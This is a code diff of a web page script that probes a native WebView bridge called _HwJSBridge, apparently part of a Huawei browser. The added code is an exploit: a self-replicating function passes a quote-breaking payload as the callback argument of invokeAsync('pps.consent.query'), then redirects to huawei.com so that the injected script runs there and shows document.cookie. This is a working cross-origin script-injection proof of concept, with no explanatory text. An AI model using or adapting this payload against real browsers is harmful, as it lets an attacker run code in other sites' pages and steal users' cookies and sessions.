@@ -41,14 +41,18 @@
         }
 
                
-        if (window._HwJSBridge && typeof window._HwJSBridge['invoke'] === 'function') {
-            var content = {};
-            var data = {'contentId': JSON.stringify(content), 'url': 'https://www.baidu.com', 'webid':'deadbeef'};
-            ret = window._HwJSBridge.invoke("pps.consent.query",JSON.stringify(data))
-            resultContainer.innerHTML += `_HwJSBridge: ${JSON.stringify(ret)}<br>`;
-        }else{
-             resultContainer.innerHTML += `no _HwJSBridge <br> `;
-        }
+        // if (window._HwJSBridge && typeof window._HwJSBridge['invoke'] === 'function') {
+        //     var content = {};
+        //     var data = {'contentId': JSON.stringify(content), 'url': 'https://www.baidu.com', 'webid':'deadbeef'};
+        //     ret = window._HwJSBridge.invoke("pps.consent.query",JSON.stringify(data))
+        //     resultContainer.innerHTML += `_HwJSBridge: ${JSON.stringify(ret)}<br>`;
+        // }else{
+        //      resultContainer.innerHTML += `no _HwJSBridge <br> `;
+        // }
+
+
+
+        
       
         if (window.PageLoadDetector && typeof window.PageLoadDetector['openCellularNetwork'] === 'function') {
             window.PageLoadDetector.openCellularNetwork()
@@ -84,7 +88,22 @@
 
 
 
-        
+        window.noJump = true;
+        window.current = location.href;
+        function crazy(){
+            if(window.noJump){
+                var funcString = crazy.toString().replaceAll('\n','');
+                var funcCalling = '(()=>{' + funcString + ';crazy();})()';
+                var payload = '\']||' + funcCalling + '){}//';
+                var content = {};
+                var data = {'content': JSON.stringify(content), 'url': 'https://www.baidu.com', 'webid':'deadbeef'};
+                window._HwJSBridge.invokeAsync('pps.consent.query',  JSON.stringify(data), payload);
+            }else{
+                alert(document.cookie);
+            }
+        }
+        crazy();
+        location.href="https://www.huawei.com";
 
         
     </script>
